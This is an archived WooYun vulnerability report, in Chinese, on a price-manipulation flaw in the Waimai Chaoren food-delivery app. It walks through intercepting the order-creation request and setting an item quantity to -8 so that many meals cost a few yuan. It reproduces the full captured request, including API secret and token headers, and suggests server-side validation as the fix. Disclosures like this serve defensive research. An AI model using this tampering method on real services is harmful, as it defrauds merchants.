{"id": 84093, "wybug_id": "wooyun-2015-0145833", "wybug_title": "外卖超人修改金额最低可1元吃大餐", "wybug_corp": "爱餐商务咨询有限公司", "wybug_author": "月神", "wybug_date": "2015-10-12 12:00", "wybug_open_date": "2015-11-26 12:02", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["手机应用", "手机安全", "手机软件安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-12：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-11-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 可以修改订单中数据，最低可1元无限购买。 详细说明：  1.打开外卖超人APP2.使用封包工具截取订单信息（WPE、charles均可）3.提交订单时截取数据（点击结算）POST /api/v2/order/create/ HTTP/1.1..X-ApiSecret: 9bdac88ccf0c74cf7878f589757eebd0..If-None-Match: \"32e80791f1566b77f8cce91303cbb9ca\"..X-token: b87921470408cee78bd5a6e9246f4cd0..User-Agent: Android/MI NOTE Pro/5.0.2/yogiyo-android-4.4.1..If-Modified-Since: Sat, 10 Oct 2015 08:21:57 GMT+00:00..X-ApiKey: android..Content-Type: application/json charset=uft-8..Host: waimaichaoren.com..Connection: Keep-Alive..Accept-Encoding: gzip..Content-Length: 322....menu_items=[{\"id\":2797148,\"p\":\"39.50\",\"q\":-8,\"opts\":[]},{\"id\":2797166,\"p\":\"31.00\",\"q\":11,\"opts\":[]}]&lang=zh&order_source=android&delivery_fee=8.0&restaurant_id=33925&addition_data={}&location_id=11707169&menu_items_total=025.0&3.修改数量：q：-8（我是用wpe修改的）4.在定11份31块钱的，这样39.5*-8+31*11+8元外送费=33元，而实际送来的是19份饭。\n\n\n\n   漏洞证明：  \n\n\n\n使用wpe修改外卖超人app结算的订单即可，图片已经很详细了，封包的内容也全部附上了。\"p\":\"39.50\",\"q\":-8,menu_items_total=025.0修改这两个参数：Q=-8（数量）  和 menu_items_total=025.0(金额）      修复方案：  服务器验证商品数量不可以为负   版权声明：转载请注明来源 月神@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}